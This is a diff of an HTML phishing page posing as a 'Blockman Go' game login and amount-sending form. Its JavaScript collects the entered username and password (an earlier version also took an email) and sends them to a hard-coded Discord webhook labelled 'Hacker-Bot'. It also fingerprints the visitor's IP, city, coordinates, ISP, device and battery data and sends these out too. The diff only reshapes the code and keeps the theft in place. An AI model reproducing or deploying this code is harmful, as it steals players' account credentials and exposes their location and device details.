@@ -64,92 +64,53 @@
 </head>
 <body>
   <div class="Frame" id="Frame">
-  	<h1 class="Text">Blockman Go</h1>
-    <div id="Gui1">
-  <div class="">
-    <input type="email" name="email" id="email" value="" class="Input" placeholder="Email" required/>
-    <div class="TextRed" id="SE">
-      Enter the email
-    </div>
-  </div>
-  <br>
-  <div class="">
-    <input type="text" name="Name" id="Name" value="" class="Input" placeholder="Please enter the username/ID" required/>
-    <div class="TextRed" id="SN">
-      Enter the name
-    </div>
-  </div>
-  <br>
-  <div class="">
-    <input type="password" name="Password2" id="Password2" class="Input" placeholder="Password" required/>
-    <div class="TextRed" id="SP2">
-      Enter the password
-    </div>
-  </div>
-  <br>
+ <h1 class="Text">Blockman Go</h1>
+ <div id="Gui1"><br>
+  <div><input type="text" name="Name" id="Name" value="" class="Input" placeholder="Please enter the username/ID" required/><div class="TextRed" id="SN">Enter the name</div></div><br>
+  <div><input type="password" name="Password2" id="Password2" class="Input" placeholder="Password" required/><div class="TextRed" id="SP2">Enter the password</div></div><br>
   <button class="button" type="submit" onclick="One(this)">Done</button>
   </div>
   <div id="Gui2" class="Gui2" >
-    <br>
-    <input type="number" name="" id="amount" class="Input" placeholder="Enter the amount">
-    <audio src="content://media/external/downloads/1000000036"></audio>
-    <button class="button" type="submit" id="buttonSend" onclick="Send()">Send</button>
+    <div><input type="number" name="" id="amount" class="Input" placeholder="Enter the amount"></div><br>
+    <div><button class="button" type="submit" id="buttonSend" onclick="Send()">Send</button></div><br>
   </div>
   </div>
   <script>
   function One(event) {
       const Gui1 = document.getElementById("Gui1");
       const Gui2 = document.getElementById("Gui2");
-      const Email = document.getElementById("email").value;
       const Name = document.getElementById("Name").value;
       const Password2 = document.getElementById("Password2").value;
-      const SE = document.getElementById("SE");
       const SN = document.getElementById("SN");
       const SP2 = document.getElementById("SP2");
-      if (Email === "") {
-         SP2.textContent = "Enter the email";
-         SE.style.transform = "scaleX(1)";
-      }else{
-         if (Email.match(/^[A-Za-z\._\-0-9]*[@][A-Za-z]*[\.][a-z]{2,4}$/)) {
-           SE.style.transform = "scaleX(0)";
-         }else{
-           SE.textContent = "Enter the valid email";
-           SE.style.transform = "scaleX(1)";}}
-       if (Name === "") {
+      if (Name === "") {
           SN.style.transform = "scaleX(1)";
-       }else{
-       if (Name.length < 6) {
+      }else{
+      if (Name.length < 6) {
           SN.textContent = "Please enter at least 6 character";
           SN.style.transform = "scaleX(1)";
-       }else{
+      }else{
           SN.style.transform = "scaleX(0)";}}
-       if (Password2 === "") {
+      if (Password2 === "") {
          SP2.textContent = "Enter the password";
          SP2.style.transform = "scaleX(1)";
-       }else{
+      }else{
          if (Password2.length < 6) {
          SP2.textContent = "Please enter at least 6 character";
          SP2.style.transform = "scaleX(1)";
-       }else{
+      }else{
          SP2.style.transform = "scaleX(0)";}}
-        if (Password2.length > 5 && Name.length > 5 && Email.match(/^[A-Za-z\._\-0-9]*[@][A-Za-z]*[\.][a-z]{2,4}$/)) {
+      if (Password2.length > 5 && Name.length > 5) {
         Gui1.style.display = 'none';
         Gui2.style.transform = 'scaleX(1)';
         event.style.transform = 'scaleX(0)';
-        const info = `
-[+]Information: 2
-[+]Email: ${Email}
+      const info = 
+`[+]Information: 2
 [+]Name: ${Name}
 [+]Password: ${Password2}`;
 console.log(info);
-        const messagePayload = {
-        content: `\`\`\`\n${info}\n\`\`\``,
-        username: "Hacker-Bot: 2",
-        avatar_url: "https://example.com/avatar.png"}
-    fetch(webhookURL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(messagePayload)})}}
+const messagePayload = {content: `\`\`\`\n${info}\n\`\`\``, username: "Hacker-Bot: 2", avatar_url: "https://example.com/avatar.png"}
+fetch(webhookURL, {method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(messagePayload)})}}
 const webhookURL = "https://canary.discord.com/api/webhooks/1350065893597777981/QBYJC8ih6btu1RwnJWXThQT7kdKzxJK-3SNSOdWRHTKiahfHHpgfBoPmIpeOzd3hwHd7"
 const batteryInfo = navigator.getBattery ? navigator.getBattery() : null;
 const getDeviceName = () =>{
@@ -193,31 +154,18 @@ async function getC(){
     try {
         let response = await fetch('https://ipapi.co/json/');
         let data = await response.json();
-        C = data.country_name + " " + data.country;
-        L = data.languages
-        CC = data.country_calling_code
-        Ci = data.city
-        Re = data.region
-        Of = data.utc_offset
-        TZ = data.timezone
-        LG = data.longitude
-        LT = data.latitude
-        CA = data.country_area
-        Asn = data.asn
-        Org = data.org
-        CP = data.country_population
+        C = data.country_name + " " + data.countr, L = data.languages, CC = data.country_calling_code, Ci = data.city, Re = data.region, Of = data.utc_offset, TZ = data.timezone, LG = data.longitude, LT = data.latitude, CA = data.country_area, Asn = data.asn, Org = data.org, CP = data.country_population
     } catch (error) {
         console.error('Error fetching country:', error);
         C = "Unknown";}}
-getIP(); 
-getC();
+getIP(); getC();
 async function sendToDiscord(){
-    if (isAndroid){
-      getLocalIP().then((ip)=>{
-            localIP = ip;
-               batteryInfo.then(battery => {
-               let info = `
-[+] Device: Android
+ if (isAndroid){
+  getLocalIP().then((ip)=>{
+   localIP = ip;
+    batteryInfo.then(battery => {
+     let info = 
+`[+] Device: Android
 [+] Information: 1
 [+] Time: ${timeInfo||"Unknown"}
 [+] Country: ${C||"Unknown"}
@@ -260,17 +208,11 @@ async function sendToDiscord(){
 [+] Battery Charging Time: ${battery.chargingTime||"Unknown"}
 [+] Battery Discharging Time: ${battery.dischargingTime||"Unknown"}`;
 console.log(info);
-const messagePayload = {
-    content: `\`\`\`\n${info}\n\`\`\``,
-    username: "Hacker-Bot: 1",
-    avatar_url: "https://example.com/avatar.png"}
-fetch(webhookURL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(messagePayload)})})});
-    }else if (isIOS){
-    let info = `
-[+] Device: Android
+const messagePayload = {content: `\`\`\`\n${info}\n\`\`\``, username: "Hacker-Bot: 1", avatar_url: "https://example.com/avatar.png"}
+fetch(webhookURL, {method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(messagePayload)})})});
+}else if (isIOS){
+let info = 
+`[+] Device: Android
 [+] Information: 1
 [+] Time: ${timeInfo||"Unknown"}
 [+] Country: ${C||"Unknown"}
